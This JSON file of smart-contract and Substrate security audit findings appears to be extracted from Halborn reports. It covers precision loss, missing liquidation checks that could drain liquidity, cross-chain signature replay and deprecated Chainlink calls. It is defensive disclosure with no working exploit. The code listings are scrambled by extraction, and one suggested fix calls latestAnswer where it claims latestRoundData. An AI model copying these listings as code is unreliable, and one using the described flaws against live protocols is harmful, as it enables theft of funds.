        "body": "Cognitive Complexity is a measure of how hard the control flow of a function is to understand. Functions with high Cognitive Complexity will be difficult to maintain. CrossChainPathFindingService.ts - refreshDst Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to refactor this function to reduce its cognitive complexity by separating it to different functions. Remediation Plan: ACKNOWLEDGED: The DeBridge team acknowledged this finding. 21 ",
        "labels": [
            "Halborn",
            "deBridge_Cross_Chain_Swap",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/deBridge_Cross_Chain_Swap_Smart_Contract_Security_Audit_Report_Halborn.pdf",
        "body": "In public functions, array arguments are immediately copied to mem- ory, while external functions can read directly from calldata. Reading Public functions need to calldata is cheaper than memory allocation. write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Furthermore, methods do not necessarily have to be public if they are only called within the contract-in such case they should be marked internal. Code Location: LPConnector.sol - getUnwrapToken Listing 12: LPConnector.sol function getUnwrapToken ( address _wrappedToken ) public view 51  returns ( address ) { 52 53 } return pools [ _wrappedToken ]. jToken ; Risk Level: Likelihood - 1 Impact - 1 22 Recommendation: It is recommended to mark this function as external, if it will not be called inside the contract. Remediation Plan: SOLVED: The issue was solved by the DeBridge team.  Fix Commit 23 3.6 STATIC ANALYSIS REPORT ",
        "labels": [
            "Halborn",
            "deBridge_Cross_Chain_Swap",
            "Severity: Informational"
        ]
    },
    {
        "title": "HAL",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Polygon_Avail_Substrate_Pallet_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The following crates used in the avail have known vulnerabilities: RUSTSEC-2021-0130 RUSTSEC-2020-0071 lru 0.6.6 time 0.1.44 Use after free in lru crate Potential segfault in the time crate Risk Level: Likelihood - 1 Impact - 3 Recommendation: RUSTSEC-2021-0130 RUSTSEC-2020-0071 lru 0.6.6 time 0.1.44 Upgrade to >=0.7.1 Upgrade to >=0.2.23 Even if those vulnerable crates cannot affect the underlying application, it is advised to be aware of them. Furthermore, you need to set up dependency monitoring to always be alerted when a new vulnerability is disclosed in one of the project crates. Remediation plan: PENDING: The issue will be addressed in the future with an upstream update. 13 ",
        "labels": [
            "Halborn",
            "Polygon_Avail_Substrate_Pallet",
            "Severity: Low"
        ]
    },
    {
        "title": "HAL",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Polygon_Avail_Substrate_Pallet_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The documentation describes an RPC method get_blockConfidence which is not implemented in the code. This can be confirmed by querying the node RPC endpoint at http://127.0.0.1:9933 Code Location: Listing 1 {\" jsonrpc \" : \" 2.0 \" ,\" result \" :{ \" methods \" :[ \" account_nextIndex \" ,\" curl -H \" Content - Type : application / json \" -d ' {\" id \":1 , \" jsonrpc 1  \":\"2.0\" , \" method \": \" rpc_methods \"} ' http :// localhost :9933/ 2 3  author_hasKey \" ,\" author_hasSessionKeys \" ,\" author_insertKey \" ,\"  author_pendingExtrinsics \" ,\" author_removeExtrinsic \" ,\"  author_rotateKeys \" ,\" author_submitAndWatchExtrinsic \" ,\"  author_submitExtrinsic \" ,\" author_unwatchExtrinsic \" ,\"  babe_epochAuthorship \" ,\" chain_getBlock \" ,\" chain_getBlockHash \" ,\"  chain_getFinalisedHead \" ,\" chain_getFinalizedHead \" ,\" chain_getHead \" ,\"  chain_getHeader \" ,\" chain_getRuntimeVersion \" ,\"  chain_subscribeAllHeads \" ,\" chain_subscribeFinalisedHeads \" ,\"  chain_subscribeFinalizedHeads \" ,\" chain_subscribeNewHead \" ,\"  chain_subscribeNewHeads \" ,\" chain_subscribeRuntimeVersion \" ,\"  chain_unsubscribeAllHeads \" ,\" chain_unsubscribeFinalisedHeads \" ,\"  chain_unsubscribeFinalizedHeads \" ,\" chain_unsubscribeNewHead \" ,\"  chain_unsubscribeNewHeads \" ,\" chain_unsubscribeRuntimeVersion \" ,\"  childstate_getKeys \" ,\" childstate_getKeysPaged \" ,\"  childstate_getKeysPagedAt \" ,\" childstate_getStorage \" ,\"  childstate_getStorageEntries \" ,\" childstate_getStorageHash \" ,\"  childstate_getStorageSize \" ,\" grandpa_proveFinality \" ,\"  grandpa_roundState \" ,\" grandpa_subscribeJustifications \" ,\"  grandpa_unsubscribeJustifications \" ,\" kate_blockLength \" ,\"  kate_queryProof \" ,\" mmr_generateProof \" ,\" offchain_localStorageGet \" ,\"  offchain_localStorageSet \" ,\" payment_queryFeeDetails \" ,\"  payment_queryInfo \" ,\" state_call \" ,\" state_callAt \" ,\"  state_getChildReadProof \" ,\" state_getKeys \" ,\" state_getKeysPaged \" ,\"  state_getKeysPagedAt \" ,\" state_getMetadata \" ,\" state_getPairs \" ,\" 14  state_getReadProof \" ,\" state_getRuntimeVersion \" ,\" state_getStorage \" ,\"  state_getStorageAt \" ,\" state_getStorageHash \" ,\" state_getStorageHashAt  \" ,\" state_getStorageSize \" ,\" state_getStorageSizeAt \" ,\"  state_queryStorage \" ,\" state_queryStorageAt \" ,\"  state_subscribeRuntimeVersion \" ,\" state_subscribeStorage \" ,\"  state_traceBlock \" ,\" state_unsubscribeRuntimeVersion \" ,\"  state_unsubscribeStorage \" ,\" subscribe_newHead \" ,\"  sync_state_genSyncSpec \" ,\" system_accountNextIndex \" ,\"  system_addLogFilter \" ,\" system_addReservedPeer \" ,\" system_chain \" ,\"  system_chainType \" ,\" system_dryRun \" ,\" system_dryRunAt \" ,\" system_health  \" ,\" system_localListenAddresses \" ,\" system_localPeerId \" ,\" system_name \"  ,\" system_nodeRoles \" ,\" system_peers \" ,\" system_properties \" ,\"  system_removeReservedPeer \" ,\" system_reservedPeers \" ,\"  system_resetLogFilter \" ,\" system_syncState \" ,\"  system_unstable_networkState \" ,\" system_version \" ,\"  unsubscribe_newHead \" ], \" version \" :1} , \" id \" :1} 4 Recommendation: it is recommended to review the code and documentation to correct the state of one another. References:  https://avail-docs.matic.today/docs/intro/#how-to-get-guarantees- that-the-data-behind-the-transaction-is-available Remediation plan: SOLVED: This issue was fixed by updating the docs. 15 ",
        "labels": [
            "Halborn",
            "Polygon_Avail_Substrate_Pallet",
            "Severity: Informational"
        ]
    },
    {
        "title": "HAL",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Polygon_Avail_Substrate_Pallet_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was noticed that Avail solution does not implement any custom origin. Custom origins can be used as authorization checks inside privileged functions, as well as to define custom access-control logic. Code Location: Listing 2: pallets/dactr/src/lib.rs (Line 145) 140 141 142 143 144 145 146 147 148 pub fn submit_block_length_proposal ( origin : OriginFor <T >, rows : u32 , cols : u32 , ) -> DispatchResultWithPostInfo { ensure_root ( origin ) ?; ensure! ( rows <= T :: MaxBlockRows :: get () && cols <= T ::  MaxBlockCols :: get () , 149 150 151 152 Error :: <T >:: BlockDimensionsOutOfBounds ); ensure! ( rows >= T :: MinBlockRows :: get () && cols >= T ::  MinBlockCols :: get () , 153 154 155 156 157 158 Error :: <T >:: BlockDimensionsTooSmall ); let _id = Self :: next_block_len_proposal_id () ?; let block_length = BlockLength :: with_normal_ratio ( rows , cols ,  BLOCK_CHUNK_SIZE , NORMAL_DISPATCH_RATIO ); 159 160 161 DynamicBlockLength :: <T >:: put (& block_length ); Self :: deposit_event ( Event ::  BlockLengthProposalSubmitted { rows , cols }) ; 162 163 Ok (() . into () ) 16 164 } Recommendation: It is recommended to implement at least one custom origin mapped to col- lective/governance, so implementation of potential access-control logic is much easier if project is developed further and grows in codebase/u- tilities in the future. Remediation plan: ACKNOWLEDGED: The issue was acknowledged by the Polygon team. It could be addressed in later versions. The Polygon team is aware of the custom logic implementation and it could be implemented in future releases when the project actually uses governance or any other similar pallets. 17 ",
        "labels": [
            "Halborn",
            "Polygon_Avail_Substrate_Pallet",
            "Severity: Informational"
        ]
    },
    {
        "title": "HAL",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Polygon_Avail_Substrate_Pallet_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The avail does not have mechanism to remove unused App_Id. This could lead to unnecessary storage usage. Furthermore, App_Id is uint32 and has a limited size, which means it could cause denial of the service if it reaches maximum value. Code Location: Listing 3: pallets/dactr/src/lib.rs 1 cat lib . rs | grep \" pub fn \" 2 pub fn create_application_key ( 3 pub fn submit_data ( 4 pub fn submit_block_length_proposal ( 5 pub fn build_storage (& self ) -> Result < sp_runtime :: Storage , String >  { 6 pub fn assimilate_storage (& self , storage : & mut sp_runtime :: Storage  ) -> Result <() , String > { 7 pub fn next_application_id () -> Result < AppId , Error <T >> { 8 pub fn next_block_len_proposal_id () -> Result < T ::  BlockLenProposalId , Error <T >> { Recommendation: Implement logic that will either enable to remove unused App Ids via consensus or clear them automatically after certain period of inactivity. Remediation plan: ACKNOWLEDGED: The issue was acknowledged by the Polygon team. It could be addressed with in later versions. Redesigning the app_id logic currently 18 could introduce more potential threats, while at this point the security impact is very limited. 19 ",
        "labels": [
            "Halborn",
            "Polygon_Avail_Substrate_Pallet",
            "Severity: Informational"
        ]
    },
    {
        "title": "PRECISION LOSS IN PARTIALLYCLOSEPOSITION FUNCTION WILL BLOCK THE LAST USER FROM CLOSING THE POSITION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Unlimited_Network_Unlimited_Leverage_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The partiallyClosePositionViaSignature() function call has the following flow: 1. TradeManagerOrders.partiallyClosePositionViaSignature() 2. TradeManagerOrders._partiallyClosePosition() 3. TradePair.partiallyClosePosition() 4. TradePair._partiallyClosePosition() 5. PositionMaths.partiallyClose() Listing 1: PositionMaths.sol (Lines 438,452,453,454) 419 /* * 420 421 422 * @dev Partially closing works as follows : * * 1. Sell a share of the position , and use the proceeds to either  : * 2. a ) Get a payout and by this , leave the leverage as it is * 2. b ) \" Buy \" new margin and by this decrease the leverage * 2. c ) a mixture of 2. a) and 2. b) */ 423 424 425 426 427 function _partiallyClose ( Position storage self , int256  currentPrice , uint256 closeProportion ) 428 429 430 { 431 432 433 internal returns ( int256 ) require ( closeProportion < PERCENTAGE_MULTIPLIER , \" PositionMaths :: _partiallyClose : cannot partially close  full position \" ); 434 435 18 436 437 438 Position memory delta ; // Close a proportional share of the position delta . margin = self . _lastNetMargin () * closeProportion /  PERCENTAGE_MULTIPLIER ; 439 delta . volume = self . volume * closeProportion /  PERCENTAGE_MULTIPLIER ; 440 delta . assetAmount = self . assetAmount * closeProportion /  PERCENTAGE_MULTIPLIER ; 441 442 // The realized PnL is the change in volume minus the price of  the changes in size at LONG 443 444 // And the inverse of that at SHORT // @dev At a long position , the delta of size is sold to give  back the volume 445 // @dev At a short position , the volume delta is used , to \" buy  \" the change of size ( and give it back ) 446 int256 priceOfSizeDelta = currentPrice * int256 ( delta .  assetAmount ) / int256 (10 ** self . assetDecimals ); //  priceOfAssetAmountDelta 447 int256 realizedPnL = ( priceOfSizeDelta - int256 ( delta . volume ))  * self . _shortMultiplier () ; 448 449 450 451 452 453 454 455 456 457 458 } int256 payout = int256 ( delta . margin ) + realizedPnL ; // change storage values self . margin -= delta . margin ; self . volume -= delta . volume ; self . assetAmount -= delta . assetAmount ; // Return payout for further calculations return payout ; In the line 438 of the PositionMaths library, the following operation is performed: delta.margin = self._lastNetMargin()*closeProportion/PERCENTAGE_MULTIPLIER In that division, some precision is lost and the delta.margin value is then subtracted from the storage: self.margin -= delta.margin. This precision loss here will cause 2 different problems. 19 PROBLEM #1: The last user in the system will never be able to close his position as the TradePair contract will not have enough balance to pay the maker: Listing 2: TradePair.sol (Lines 279,283,285) Position storage position = positions [ positionId_ ]; 259 function _closePosition ( uint256 positionId_ ) private { 260 261 262 263 // Clear Buffer ( uint256 remainingMargin , uint256 remainingBufferFee , uint256  requestLoss ) = _clearBuffer ( position , false ); 264 265 266 267 268 269 // Get the payout to the maker uint256 payoutToMaker = _getPayoutToMaker ( position ); // update aggregated values positionStats . removeTotalCount ( position . margin , position .  volume , position . assetAmount , position . isShort ); 270 271 int256 protocolPnL = int256 ( remainingMargin ) - int256 (  payoutToMaker ) - int256 ( requestLoss ); 272 273 274 275 276 277 278 // fee manager receives the remaining fees _depositBorrowFees ( remainingBufferFee ); uint256 payout = _registerProtocolPnL ( protocolPnL ); // Make sure the payout to maker does not exceed the  collateral for this position made up of the remaining margin and  the ( possible ) received loss payout 20 279 emit Debug ( payoutToMaker , payout , remainingMargin , collateral .  balanceOf ( address ( this )) ); 280 281 282 283 if ( payoutToMaker > payout + remainingMargin ) { payoutToMaker = payout + remainingMargin ; } emit Debug ( payoutToMaker , payout , remainingMargin , collateral .  balanceOf ( address ( this )) ); 284 285 if ( payoutToMaker > 0) { _payoutToMaker ( position . owner , int256 ( payoutToMaker ) ,  positionId_ ); } 286 287 288 emit RealizedPnL ( position . owner , positionId_ ,  _getCurrentNetPnL ( position )) ; 289 290 emit ClosedPosition ( positionId_ , _getCurrentPrice ( position .  isShort , true )); 291 292 293 294 } // Finally delete position _deletePosition ( positionId_ ); PROBLEM #2: when _registerProtocolPnL() is called the At a position closure, TradePair smart contract will not have enough balance to transfer protocolPnL_ to the LiquidityPoolAdapter: 21 Listing 3: TradePair.sol (Line 724) 716 /* * 717 718 719 720 721 function _registerProtocolPnL ( int256 protocolPnL_ ) internal * @notice Registers profit or loss at liquidity pool adapter * @param protocolPnL_ Profit or loss of protocol * @return payout Payout received from the liquidity pool adapter */  returns ( uint256 payout ) { 722 723 724 if ( protocolPnL_ > 0) { // Profit collateral . safeTransfer ( address ( liquidityPoolAdapter ) ,  uint256 ( protocolPnL_ )) ; 725 726 727 728 liquidityPoolAdapter . depositProfit ( uint256 ( protocolPnL_ )); } else if ( protocolPnL_ < 0) { // Loss payout = liquidityPoolAdapter . requestLossPayout ( uint256 (-  protocolPnL_ )); 729 730 731 } } // if PnL == 0, nothing happens Risk Level: Likelihood - 5 Impact - 3 Recommendation: It is recommended to use mulDiv() from the Uniswaps FullMath library in all the divisions to avoid the precision loss. References: Uniswap V3s docs Mathematical explanation 22 Remediation Plan: SOLVED: The Unlimited Network team solved the issue in the following commit ID. Commit ID : ae36e3ddea25900d66245c82f88aaafc92266c05. During the second review, it has been observed that this change was committed on PR #121 and merged into the master branch. 23 ",
        "labels": [
            "Halborn",
            "Unlimited_Network_Unlimited_Leverage",
            "Severity: High"
        ]
    },
    {
        "title": "OPENPOSITIONVIASIGNATURE DOES NOT CHECK THAT THE POSITION IS NOT LIQUIDATABLE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Unlimited_Network_Unlimited_Leverage_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the TradeManagerOrders contract, the function openPositionViaSignature () is used to an open a new position in Unlimited Leverage. This function As this is missing the _verifyPositionsValidity(positionId_); check. check is missing, users may open liquidatable positions directly. Under a wrong configuration or a high liquidation fee, this could be abused to drain all the liquidity from the liquidity pools by creating tiny liquidatable positions and then liquidating them to get the liquidation fee. Code Location: Listing 4: TradeManagerOrders.sol (Line 49) * @notice Opens a position with a signature * @param order_ Order struct * @param maker_ address of the maker * @param signature_ signature of order_ by maker_ */ 29 /* * 30 31 32 33 34 35 function openPositionViaSignature ( 36 37 38 39 40 ) external onlyOrderExecutor onlyActiveTradePair ( order_ . params .  tradePair ) returns ( uint256 ) { 41 42 43 OpenPositionOrder calldata order_ , UpdateData [] calldata updateData_ , address maker_ , bytes calldata signature_ _updateContracts ( updateData_ ); _processSignature ( order_ , maker_ , signature_ ); _verifyConstraints ( 24 order_ . params . tradePair , order_ . constraints , order_ . params _transferOrderReward ( order_ . params . tradePair , maker_ , msg . uint256 positionId = _openPosition ( order_ . params , maker_ ); sigHashToTradeId [ keccak256 ( signature_ )] = TradeId ( order_ . ); 44  . isShort ? UsePrice . MAX : UsePrice . MIN 45 46 47  sender ); 48 49 50 51  params . tradePair , uint96 ( positionId )); 52 53  positionId , signature_ ); 54 55 56 } return positionId ; emit OpenedPositionViaSignature ( order_ . params . tradePair , Listing 5: TradeManager.sol (Lines 59-61) ITradePair ( params_ . tradePair ). collateral () . safeTransferFrom ( * @notice Opens a position for a trading pair . * @param params_ The parameters for opening a position . * @param maker_ Maker of the position */ 49 /* * 50 51 52 53 54 function _openPosition ( OpenPositionParams memory params_ , address  maker_ ) internal returns ( uint256 ) { 55  maker_ , address ( params_ . tradePair ) , params_ . margin ); 56 57 58 59 60  params_ . whitelabelAddress 61 62 63 64 65 66 } uint256 id = ITradePair ( params_ . tradePair ). openPosition ( userManager . setUserReferrer ( maker_ , params_ . referrer ); emit PositionOpened ( params_ . tradePair , id ); maker_ , params_ . margin , params_ . leverage , params_ . isShort , return id ; ); 25 Listing 6: TradePair.sol (Line 189) 170 /* * 171 172 173 174 * @notice opens a position * @param maker_ owner of the position * @param margin_ the amount of collateral used as a margin * @param leverage_ the target leverage , should respect  LEVERAGE_MULTIPLIER * @param isShort_ bool if the position is a short position */ 175 176 177 function openPosition ( address maker_ , uint256 margin_ , uint256  leverage_ , bool isShort_ , address whitelabelAddress ) if ( whitelabelAddress != address (0) ) { external verifyLeverage ( leverage_ ) onlyTradeManager syncFeesBefore checkAssetAmountLimitAfter returns ( uint256 ) 178 179 180 181 182 183 184 { 185 186 187 188 189 190 } 191 192 /* * 193 194 195 function _openPosition ( address maker_ , uint256 margin_ , uint256 * @dev Should have received margin from TradeManager */ return _openPosition ( maker_ , margin_ , leverage_ , isShort_ ); positionIdToWhiteLabel [ nextId ] = whitelabelAddress ; }  leverage_ , bool isShort_ ) 196 197 198 { 199 private returns ( uint256 ) require ( margin_ >= minMargin , \" TradePair :: _openPosition :  margin must be above or equal min margin \"); 200 201 202 203 204 uint256 id = nextId ; nextId ++; margin_ = _deductAndTransferOpenFee ( maker_ , margin_ , leverage_  , id ); 205 206 207 uint256 volume = ( margin_ * leverage_ ) / LEVERAGE_MULTIPLIER ; require ( volume <= volumeLimit , \" TradePair :: _openPosition : 26  borrow limit reached \"); 208 209 210 211 212  ); 213 214  ); 215 216 217 _registerUserVolume ( maker_ , volume ); uint256 assetAmount ; if ( isShort_ ) { assetAmount = priceFeedAdapter . collateralToAssetMax ( volume } else { assetAmount = priceFeedAdapter . collateralToAssetMin ( volume } ( int256 currentBorrowFeeIntegral , int256  currentFundingFeeIntegral ) = _getCurrentFeeIntegrals ( isShort_ ); 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 positions [ id ] = Position ({ margin : margin_ , volume : volume , assetAmount : assetAmount , pastBorrowFeeIntegral : currentBorrowFeeIntegral , lastBorrowFeeAmount : 0, pastFundingFeeIntegral : currentFundingFeeIntegral , lastFundingFeeAmount : 0, lastFeeCalculationAt : uint48 ( block . timestamp ) , openedAt : uint48 ( block . timestamp ) , isShort : isShort_ , owner : maker_ , assetDecimals : uint16 ( assetDecimals ) , lastAlterationBlock : uint40 ( block . number ) }) ; userToPositionIds [ maker_ ]. push ( id ); positionStats . addTotalCount ( margin_ , volume , assetAmount ,  isShort_ ); 238 239 emit OpenedPosition ( maker_ , id , margin_ , volume , assetAmount ,  isShort_ ); 240 241 242 } return id ; 27 Proof of Concept: Risk Level: Likelihood - 2 Impact - 5 Recommendation: It is recommended to add the _verifyPositionsValidity(positionId_); check in the TradePair._openPosition() function. 28 Remediation Plan: SOLVED: The Unlimited Network team solved the issue in the following commit ID. Commit ID : ae36e3ddea25900d66245c82f88aaafc92266c05. During the second review, it has been observed that this change was committed on PR #121 and merged into the master branch. 29 ",
        "labels": [
            "Halborn",
            "Unlimited_Network_Unlimited_Leverage",
            "Severity: Medium"
        ]
    },
    {
        "title": "USE OF DEPRECATED CHAINLINK FUNCTION: LATESTANSWER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Unlimited_Network_Unlimited_Leverage_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "According to Chainlinks documentation (API Reference), the latestAnswer function is deprecated. This function does not throw an error if no answer has been reached, but instead returns 0, possibly causing an incorrect price to be fed to the different price feeds or even a Denial of Service by a division by zero. Code Location: ChainlinkUsdPriceFeed.sol Listing 7: ChainlinkUsdPriceFeed.sol (Line 24) 23 function price () external view returns ( int256 ) { 24 25 } return chainlinkPriceFeed . latestAnswer () ; UnlimitedPriceFeed.sol Listing 8: UnlimitedPriceFeed.sol (Line 117) require ( updateData_ . length == DATA_LENGTH , \" UnlimitedPriceFeed PriceData memory newPriceData = abi . decode ( updateData_ [ 90 function update ( bytes calldata updateData_ ) external { 91  :: update : Bad data length \" ); 92 93  SIGNER_END :] , ( PriceData )) ; 94 95  data 96 97 98 if ( newPriceData . createdOn <= priceData . createdOn ) { return ; } // Verify new price data is more recent than the current price 30 99 100 101 // verify signer access controlls address signer = abi . decode ( updateData_ [ SIGNATURE_END :  SIGNER_END ], ( address )) ; 102 103 104 105 106 107 108 109 // throw if the signer is not allowed to update the price _verifySigner ( signer ); // verify signature bytes calldata signature = updateData_ [: SIGNATURE_END ]; require ( SignatureChecker . isValidSignatureNow ( signer ,  _hashPriceDataUpdate ( newPriceData ) , signature ) , 110 111 112 113 114 115 116 117 118 119 120 \" UnlimitedPriceFeed :: update : Bad signature \" ); // verify validity of data _verifyValidTo ( newPriceData . validTo ); // verify price deviation is not too high int256 chainlinkPrice = chainlinkPriceFeed . latestAnswer () ; unchecked { int256 maxAbsoluteDeviation = int256 ( uint256 (  chainlinkPrice ) * maxDeviation / FULL_PERCENT ); 121 122 123 require ( newPriceData . price >= chainlinkPrice -  maxAbsoluteDeviation 124 && newPriceData . price <= chainlinkPrice +  maxAbsoluteDeviation , 125 126 127 128 129 130 } \" UnlimitedPriceFeed :: update : Price deviation too high \" ); } priceData = newPriceData ; UnlimitedPriceFeedAdapter.sol In this contract a Denial of Service would occur if collateralChainlinkPriceFeed .latestAnswer() returned zero as a division by zero would occur in the _getChainlinkPrice() internal function. This would DoS any call to the UnlimitedPriceFeedAdapter.update() function. 31 Listing 9: UnlimitedPriceFeedAdapter.sol (Line 144) 143 function _assetToUsd ( uint256 assetAmount_ ) private view returns (  uint256 ) { 144 return assetAmount_ * uint256 ( assetChainlinkPriceFeed .  latestAnswer () ) / ASSET_MULTIPLIER ; 145 } Listing 10: UnlimitedPriceFeedAdapter.sol (Line 170) 169 function _collateralToUsd ( uint256 collateralAmount_ ) private view  returns ( uint256 ) { 170 return collateralAmount_ * uint256 (  collateralChainlinkPriceFeed . latestAnswer () ) /  COLLATERAL_MULTIPLIER ; 171 } Listing 11: UnlimitedPriceFeedAdapter.sol (Lines 222,223) 221 function _getChainlinkPrice () internal view returns ( int256 ) { 222 return assetChainlinkPriceFeed . latestAnswer () * int256 (  _priceMultiplier ) 223 224 } / collateralChainlinkPriceFeed . latestAnswer () ; Risk Level: Likelihood - 2 Impact - 5 Recommendation: It is recommended to use Chainlinks latestRoundData() function to get the price instead. It is also recommended to add checks on the return data with proper revert messages if the price is stale or the round is incomplete, for example: 32 Listing 12: latestRoundData example call 1 ( uint80 baseRoundID , int256 answer , , uint256 baseTimestamp ,  uint80 baseAnsweredInRound ) = assetChainlinkPriceFeed . latestAnswer  () ; 2 require ( answer > 0, \" ChainlinkPriceOracle : answer <= 0 \"); 3 require ( baseAnsweredInRound >= baseRoundID , \" ChainlinkPriceOracle :  Stale price \"); 4 require ( baseTimestamp > 0, \" ChainlinkPriceOracle : Round not  complete \" ); 5 uint256 _price = uint256 ( answer ); Remediation Plan: SOLVED: The Unlimited Network team solved the issue in the following commit ID. Commit ID : ae36e3ddea25900d66245c82f88aaafc92266c05. During the second review, it has been observed that this change was committed on PR #121 and merged into the master branch. 33 ",
        "labels": [
            "Halborn",
            "Unlimited_Network_Unlimited_Leverage",
            "Severity: Medium"
        ]
    },
    {
        "title": "UNLIMITEDPRICEFEED IS VULNERABLE TO CROSSCHAIN SIGNATURE REPLAY ATTACKS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Unlimited_Network_Unlimited_Leverage_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The UnlimitedPriceFeedUpdater smart contract contains the function update () which is used to update the price of the collateral with a valid signature: Listing 13: UnlimitedPriceFeedUpdater.sol (Lines 90-93) // Verify new price data is more recent than the current price * @notice Update price with signed data . * @param updateData_ Data bytes consisting of signature , signer , */ PriceData memory newPriceData = abi . decode ( updateData_ [ 67 /* * 68 69  and price data in respected order . 70 71 function update ( bytes calldata updateData_ ) external { 72 require ( updateData_ . length == DATA_LENGTH , \"  UnlimitedPriceFeedUpdater :: update : Bad data length \" ); 73 74  SIGNER_END :] , ( PriceData )) ; 75 76  data 77 78 79 80 81 82 83  SIGNER_END ], ( address )) ; 84 85 86 87 88 89 90 // Return if the new price data is not more recent if ( newPriceData . createdOn <= priceData . createdOn ) { // verify signature bytes calldata signature = updateData_ [: SIGNATURE_END ]; require ( // verify signer access controlls address signer = abi . decode ( updateData_ [ SIGNATURE_END : // throw if the signer is not allowed to update the price _verifySigner ( signer ); return ; } 34 \" UnlimitedPriceFeedUpdater :: update : Bad signature \" SignatureChecker . isValidSignatureNow ( signer , ); 91  _hashPriceDataUpdate ( newPriceData ) , signature ) , 92 93 94 95 96 97 98 99 100 101 } // verify validity of data _verifyValidTo ( newPriceData . validTo ); _verifyNewPrice ( newPriceData . price ); priceData = newPriceData ; The signature hash is built through the _hashPriceDataUpdate() function: Listing 14: UnlimitedPriceFeedUpdater.sol (Line 106) 105 function _hashPriceDataUpdate ( PriceData memory priceData_ )  internal view returns ( bytes32 ) { 106 107 } return keccak256 ( abi . encode ( address ( this ) , priceData_ )) ; The PriceData struct is also built as shown below: Listing 15: UnlimitedPriceFeedUpdater.sol * @notice Struct to store the price feed data . * @custom : member createdOn The timestamp when the price data was * @custom : member validTo The timestamp until which the price data 9 /* * 10 11  stored . 12  is valid . 13 14 15 struct PriceData { 16 17 18 19 } uint32 createdOn ; uint32 validTo ; int192 price ; * @custom : member price The price . */ This implementation: 35 Mitigates any risk of reusing an old signature, as the update() 1. function verifies that the new price data is more recent than the current price data. 2. Verifies that the data is valid through the _verifyValidTo() function. 3. Verifies that the price does not deviate too much by comparing the new price with the price of a Chainlink oracle. Although, this implementation does not use any type of Domain Separator, making it vulnerable to cross-chain replay attacks. This would be an issue under the following conditions: 1. Unlimited Leverage is deployed in multiple blockchains (i.e. Arbitrum & Polygon), under the same contract addresses. 2. The same signer is set in the Controller for both blockchains. 3. A malicious user would be able to use signatures crafted for Arbitrum in the Polygon contract and vice versa. Risk Level: Likelihood - 1 Impact - 5 Recommendation: It is recommended to use a Domain Separator when creating the PriceData signature. Remediation Plan: SOLVED: The Unlimited Network team solved the issue in the following commit ID. Commit ID : ae36e3ddea25900d66245c82f88aaafc92266c05. During the second review, it has been observed that this change was committed on PR #121 and merged into the master branch. 36 ",
        "labels": [
            "Halborn",
            "Unlimited_Network_Unlimited_Leverage",
            "Severity: Medium"
        ]
    },
    {
        "title": "CENTRALIZATION RISK: ORDEREXECUTOR COULD CLOSE POSITIONS IN HIS BENEFIT BEFORE EVERY PRICE UPDATE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Unlimited_Network_Unlimited_Leverage_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The Unlimited Leverage protocol will use the UnlimitedPriceFeedAdapter as a price feed. This price feed will be updated by an authorized signer through the UnlimitedPriceFeedUpdater.update() function: Listing 16: UnlimitedPriceFeedUpdater.sol (Lines 90-93) // Verify new price data is more recent than the current price */ * @notice Update price with signed data . * @param updateData_ Data bytes consisting of signature , signer PriceData memory newPriceData = abi . decode ( updateData_ [ 67 /* * 68 69  and price data in respected order . 70 71 function update ( bytes calldata updateData_ ) external { 72 require ( updateData_ . length == DATA_LENGTH , \"  UnlimitedPriceFeedUpdater :: update : Bad data length \" ); 73 74  SIGNER_END :] , ( PriceData )) ; 75 76  data 77 78 79 80 81 82 83  SIGNER_END ], ( address )) ; 84 85 86 87 88 // Return if the new price data is not more recent if ( newPriceData . createdOn <= priceData . createdOn ) { // verify signer access controlls address signer = abi . decode ( updateData_ [ SIGNATURE_END : // throw if the signer is not allowed to update the price _verifySigner ( signer ); // verify signature return ; } 37 \" UnlimitedPriceFeedUpdater :: update : Bad signature \" bytes calldata signature = updateData_ [: SIGNATURE_END ]; require ( SignatureChecker . isValidSignatureNow ( signer , ); 89 90 91  _hashPriceDataUpdate ( newPriceData ) , signature ) , 92 93 94 95 96 97 98 99 100 101 } // verify validity of data _verifyValidTo ( newPriceData . validTo ); _verifyNewPrice ( newPriceData . price ); priceData = newPriceData ; On the other hand, all the different orders will be performed by an account with the OrderExecutor role in the TradeManagerOrders contract. For example: Listing 17: TradeManagerOrders.sol (Lines 40,41) OpenPositionOrder calldata order_ , UpdateData [] calldata updateData_ , address maker_ , bytes calldata signature_ * @notice Opens a position with a signature * @param order_ Order struct * @param maker_ address of the maker * @param signature_ signature of order_ by maker_ */ 29 /* * 30 31 32 33 34 35 function openPositionViaSignature ( 36 37 38 39 40 ) external onlyOrderExecutor onlyActiveTradePair ( order_ . params .  tradePair ) returns ( uint256 ) { 41 42 43 44  . isShort ? UsePrice . MAX : UsePrice . MIN 45 46 47  sender ); _updateContracts ( updateData_ ); _processSignature ( order_ , maker_ , signature_ ); _verifyConstraints ( _transferOrderReward ( order_ 